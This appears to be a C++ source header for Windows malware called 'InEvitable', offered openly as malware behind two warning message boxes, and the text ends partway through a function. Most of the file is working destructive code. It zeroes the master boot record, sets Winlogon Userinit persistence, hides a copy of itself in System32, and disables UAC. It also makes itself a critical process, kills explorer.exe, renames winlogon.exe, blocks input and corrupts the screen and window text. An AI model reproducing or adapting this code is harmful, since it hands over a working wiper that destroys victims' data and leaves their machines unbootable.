#pragma once
#include <Windows.h>
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>
#include "onceinabluemoon.h"
#include "data.h"
#define _CRT_SECURE_NO_WARNINGS
int random();
void strReverseW(LPWSTR str);

DWORD WINAPI ripMessageThread(LPVOID);
DWORD WINAPI payloadThread(LPVOID);
DWORD WINAPI lol(LPVOID);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

void killWindows();
void killWindowsInstant();

//int payloadExecute(int, int);
int payloadCursor(int, int);
int payloadBlink(int, int);
int payloadMessageBox(int, int);
DWORD WINAPI messageBoxThread(LPVOID);
LRESULT CALLBACK msgBoxHook(int, WPARAM, LPARAM);
int payloadChangeText(int, int);
BOOL CALLBACK EnumWindowProc(HWND, LPARAM);
void enumerateChildren(HWND);
int payloadPuzzle(int, int);
int payloadKeyboard(int, int);
int payloadPIP(int, int);

HCRYPTPROV prov;

int scrw, scrh;
int next;
BOOLEAN Run = FALSE;
BOOLEAN notepad = FALSE;
BOOL RunOnce = FALSE;



LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == WM_CLOSE || msg == WM_ENDSESSION) {
		killWindows();
		return 0;
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}

BOOLEAN tmp1;
DWORD tmp2;
/*ok fine i'm really lazy i'm doing this to get cool message box while the process is killed
but still a special instance of the process still has the protectprocess function*/
DWORD WINAPI lol(LPVOID parameter) {
	int oproc = 0;

	char* fn = (char*)LocalAlloc(LMEM_ZEROINIT, 512);
	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);

	Sleep(1000);

	for (;;) {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);

		Process32First(snapshot, &proc);

		int nproc = 0;
		do {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
			char* fn2 = (char*)LocalAlloc(LMEM_ZEROINIT, 512);
			GetProcessImageFileNameA(hProc, fn2, 512);

			if (!lstrcmpA(fn, fn2)) {
				nproc++;
			}

			CloseHandle(hProc);
			LocalFree(fn2);
		} while (Process32Next(snapshot, &proc));

		CloseHandle(snapshot);

		if (nproc < oproc) {
			killWindows();
		}

		oproc = nproc;

		Sleep(10);
	}
}

void killWindows() {
	// Show cool MessageBoxes
	for (int i = 0; i < 20; i++) {
		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
		Sleep(100);
	}

	killWindowsInstant();
}

void killWindowsInstant() {

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

DWORD WINAPI ripMessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBox(NULL, (LPCWSTR)msgs[random() % (sizeof(msgs) / sizeof(void*))], L"CodeBlue", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}

DWORD WINAPI payloadThread(LPVOID parameter) {
	int delay = 0;
	int times = 0;
	int runtime = 0;

	int(*function)(int, int) = (int(*)(int, int))parameter;

	for (;;) {
		if (delay-- == 0) {
			delay = (*function)(times++, runtime);
		}

		runtime++;
		Sleep(10);
	}
}

int payloadBlink(int times, int runtime) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);

	return 100;
}

int payloadCursor(int times, int runtime) {
	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 1)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 1)));

	return 2;
}

int payloadMessageBox(int times, int runtime) {
	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);

	return 2000.0 / (times / 10.0 + 1) + 100 + (random() % 120);
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"the doom is inevitable after all...", L"Error", MB_SYSTEMMODAL | MB_OK | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

int payloadChangeText(int times, int runtime) {
	EnumWindows(&EnumWindowProc, NULL);

	return 50;
}

BOOL CALLBACK EnumWindowProc(HWND hwnd, LPARAM lParam) {
	enumerateChildren(hwnd);

	return TRUE;
}

void enumerateChildren(HWND hwnd) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
	strReverseW(str);
	SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);

	GlobalFree(str);

	HWND child = GetWindow(hwnd, GW_CHILD);

	while (child) {
		enumerateChildren(child);
		child = GetWindow(child, GW_HWNDNEXT);
	}
}

int payloadPuzzle(int times, int runtime) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);

	int x1 = random() % (rekt.right - 100);
	int y1 = random() % (rekt.bottom - 100);
	int x2 = random() % (rekt.right - 100);
	int y2 = random() % (rekt.bottom - 100);
	int width = random() % 600;
	int height = random() % 600;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	return 200.0 / (times / 5.0 + 1) + 5;
}

int payloadKeyboard(int times, int runtime) {
	INPUT input;

	input.type = INPUT_KEYBOARD;
	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &input, sizeof(INPUT));

	return 300 + (random() % 400);
}

int payloadPIP(int times, int runtime) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	return 200.0 / (times / 5.0 + 1) + 5;
}

int random() {
	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}

void strReverseW(LPWSTR str) {
	int len = lstrlenW(str);

	WCHAR c;
	int i, j;
	for (i = 0, j = len - 1; i < j; i++, j--) {
		c = str[i];
		str[i] = str[j];
		str[j] = c;
	}

	// Fix Newlines
	for (i = 0; i < len - 1; i++) {
		if (str[i] == L'\n' && str[i + 1] == L'\r') {
			str[i] = L'\r';
			str[i + 1] = L'\n';
		}
	}
}

int dark() {
	HDC hdc = GetDC(HWND_DESKTOP);

	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);

	while (1) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		BitBlt(hdc, rand() % 2, rand() % 2, rand() % sw, rand() % sh, hdc, rand() % 2, rand() % 2, SRCAND);
		Sleep(3);
	}
}
void launch() {
	const char* exe = "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\InEvitable.exe";
	HKEY hkey;
	const char* czname = "Userinit";
	//const char* czVal = "1"; 

	LONG retVal2 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hkey, NULL);
	if (retVal2 == ERROR_SUCCESS)
	{
		RegSetValueExA(hkey, czname, 0, REG_SZ, (unsigned char*)exe, strlen(exe));
	}
	RegCloseKey(hkey);
}
void something() {
	if (MessageBoxA(NULL, "ahh.. you executed MALWARE!\r\n\This malware will harm your computer and makes it unusable.\r\n\simply press No and nothing will happen.\r\n\If you know what this malware does and are using a safe environment to test, \press Yes to start it.\r\n\r\n\DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "InEvitable", MB_YESNO | MB_ICONWARNING) != IDYES ||
		MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\STILL EXECUTE IT?", "InEvitable", MB_YESNO | MB_ICONWARNING) != IDYES) {
		ExitProcess(0);
		system("del *.exe");
	}
	//system("attrib +s +h *.exe");
	ShellExecuteA(NULL, NULL, "cmd", "attrib +s +h *.exe", NULL, SW_HIDE);
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
	launch();
	RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
	BreakOnTermination = 1;

	status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
	DWORD wb;
	char system[MAX_PATH];
	char pathtofile[MAX_PATH];
	HMODULE GetModH = GetModuleHandleA(NULL);
	GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));
	GetSystemDirectoryA(system, sizeof(system));
	strcat(system, "\\InEvitable.exe");
	CopyFileA(pathtofile, system, false);
	SetFileAttributesA("C:\\Windows\\System32\\InEvitable.exe", FILE_ATTRIBUTE_HIDDEN);
	DWORD dwVal = 0;
	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"EnableLUA", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
	HANDLE note = CreateFileA("C:\\Windows\\System32\\hello.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (note == INVALID_HANDLE_VALUE)
		ExitProcess(4);

	if (!WriteFile(note, msg, sizeof(msg), &wb, NULL))
		ExitProcess(5);
	CreateThread(NULL, NULL, &payloadThread, &payloadCursor, NULL, NULL);

	CreateThread(NULL, NULL, &payloadThread, &payloadKeyboard, NULL, NULL);

	Sleep(30000);
	CreateThread(NULL, NULL, &payloadThread, &payloadBlink, NULL, NULL);
	CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);

	Sleep(40000);
	CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);

	Sleep(80000);
	onceinabluemoon();
	CreateThread(NULL, NULL, &payloadThread, &payloadPIP, NULL, NULL);

	Sleep(15000);
	CreateThread(NULL, NULL, &payloadThread, &payloadPuzzle, NULL, NULL);
	dark();
	Sleep(20000);
	killWindowsInstant();
	for (;;) {
		Sleep(10000);
	}
}
void shit() {
	ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\Winlogon.exe & icacls C:\\Windows\\SysNative\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\SysNative\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
	ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\System32\\Winlogon.exe & icacls C:\\Windows\\System32\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\System32\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
}
DWORD WINAPI Checknkey(LPVOID lpParam) {
	while (GetAsyncKeyState(0x4E) == 0) {
		//sleep 
		Sleep(10);
	}
	killWindowsInstant();
	ExitProcess(0);
}
void notepad1() {
	BlockInput(true);
	//
	//helloyou
	HWND hWnd = FindWindow(NULL, L"Untitled - Notepad");
	HWND edit = FindWindowEx(hWnd, NULL, L"Edit", NULL);
	SetForegroundWindow(hWnd);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	//SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	//ctrl + h
	SendMessage(edit, WM_CHAR, VK_RETURN, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'M', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'?', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_RETURN, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'B', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'V', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'B', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'!', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_RETURN, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	//SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(100);
	//SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'V', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'5', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'M', 0);
	Sleep(100);
	//SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(100);
	//SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'F', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(100);
	//SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_RETURN, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'J', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(100);
	SendMessage(edit, WM_CHAR, (TCHAR)'.', 0);
	BlockInput(false);

}
BOOL CALLBACK hideProc2(HWND hwnd, LPARAM lParam) {
	DWORD pid;
	GetWindowThreadProcessId(hwnd, &pid);

	PROCESSENTRY32 proc;
	proc.dwSize = sizeof(proc);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	Process32First(snapshot, &proc);

	BOOL good = (pid == lParam || pid == GetCurrentProcessId());
	do {
		if (proc.th32ProcessID == pid &&
			(proc.th32ParentProcessID == lParam || lstrcmpiW(proc.szExeFile, L"notepad.exe") == 0)) {
			good = TRUE;

			if (IsWindowVisible(hwnd)) {
				Run = TRUE;
				RunOnce = TRUE;
			}

			break;
		}
	} while (Process32Next(snapshot, &proc));

	CloseHandle(snapshot);

	if (!good)
		ShowWindow(hwnd, SW_HIDE);

	return TRUE;
}
DWORD WINAPI notepadWatchdogThread(LPVOID parameter) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;

	for (;;) {
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		Process32First(snapshot, &proc);

		Run = FALSE;
		DWORD notepad = 0;

		do {
			if (lstrcmpiW(proc.szExeFile, L"notepad.exe") == 0) {
				Run = TRUE;
				notepad = proc.th32ProcessID;
			}
			else if (lstrcmpiW(proc.szExeFile, L"explorer.exe") == 0) {
				TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, proc.th32ProcessID), 0);
			}
		} while (Process32Next(snapshot, &proc));

		CloseHandle(snapshot);

		if (!Run && RunOnce)
			killWindowsInstant();

		Run = FALSE;
		EnumWindows(hideProc2, notepad);
		if (!Run && RunOnce)
			killWindowsInstant();

		Sleep(50);
	}
}

void execute() {
	HWND hWnd = FindWindow(NULL, L"*Untitled - Notepad");
	if (!hWnd) {
		BlockInput(true);
		HWND lol = FindWindow(NULL, L"Untitled - Notepad");
		HWND ok = FindWindowEx(lol, NULL, L"Edit", NULL);
		SetForegroundWindow(lol);
		SendMessage(ok, WM_CHAR, VK_SPACE, 1);
		SendMessage(ok, WM_CHAR, (TCHAR)'G', 0);
		Sleep(1000);
		SendMessage(ok, WM_CHAR, (TCHAR)'O', 0);
		Sleep(1000);
		SendMessage(ok, WM_CHAR, (TCHAR)'O', 0);
		Sleep(1000);
		SendMessage(ok, WM_CHAR, (TCHAR)'D', 0);
		Sleep(1000);
		SendMessage(ok, WM_CHAR, VK_SPACE, 1);
		SendMessage(ok, WM_CHAR, (TCHAR)'L', 0);
		Sleep(1000);
		SendMessage(ok, WM_CHAR, (TCHAR)'U', 0);
		Sleep(1000);
		SendMessage(ok, WM_CHAR, (TCHAR)'C', 0);
		SendMessage(ok, WM_CHAR, (TCHAR)'K', 0);
		Sleep(1000);
		SendMessage(ok, WM_CHAR, (TCHAR)'.', 0);
		//();
		Sleep(2000);
		ShellExecuteA(NULL, NULL, "taskkill /f /im notepad.exe", NULL, NULL, SW_HIDE);
		ShellExecuteA(NULL, NULL, "calc.exe", NULL, NULL, SW_SHOW);
		ShellExecuteA(NULL, NULL, "notepad.exe", NULL, NULL, SW_SHOW);
		ShellExecuteA(NULL, NULL, "mspaint.exe", NULL, NULL, SW_SHOW);
		BlockInput(false);
	}
	BlockInput(true);
	HWND edit = FindWindowEx(hWnd, NULL, L"Edit", NULL);
	SetForegroundWindow(hWnd);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'G', 0);
	Sleep(1000);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(1000);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(1000);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(1000);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(1000);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(1000);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(1000);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(1000);
	SendMessage(edit, WM_CHAR, (TCHAR)'K', 0);
	Sleep(1000);
	SendMessage(edit, WM_CHAR, (TCHAR)'.', 0);
	ShellExecute(NULL, NULL, L"taskkill /f /im notepad.exe", NULL, NULL, SW_HIDE);
	Sleep(2000);
	ShellExecuteA(NULL, NULL, "calc.exe", NULL, NULL, SW_SHOW);
	ShellExecuteA(NULL, NULL, "notepad.exe", NULL, NULL, SW_SHOW);
	ShellExecuteA(NULL, NULL, "mspaint.exe", NULL, NULL, SW_SHOW);
	BlockInput(false);
}

void InEvitableHax() {

	RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
	BreakOnTermination = 1;

	status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
	DWORD wb;
	FILE* file;
	if (file = fopen("C:\\Windows\\System32\\hello.txt", "r")) {
		fclose(file);
		DeleteFileA("C:\\Windows\\System32\\hello.txt");
		MessageBoxA(NULL, "A trail of sickness leading to me, if i'm haunted, then you'll see", "InEvitable", MB_ICONINFORMATION);
		ShellExecute(NULL, NULL, L"C:\\Windows\\notepad.exe", NULL, NULL, SW_SHOW);
		Sleep(2000);
		notepad1();
		Sleep(2000);
		CreateThread(NULL, 0, Checknkey, NULL, 0, NULL);
		execute();
		Sleep(2000);
		shit();
	}
	else {
		fclose(file);
	}

	CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);
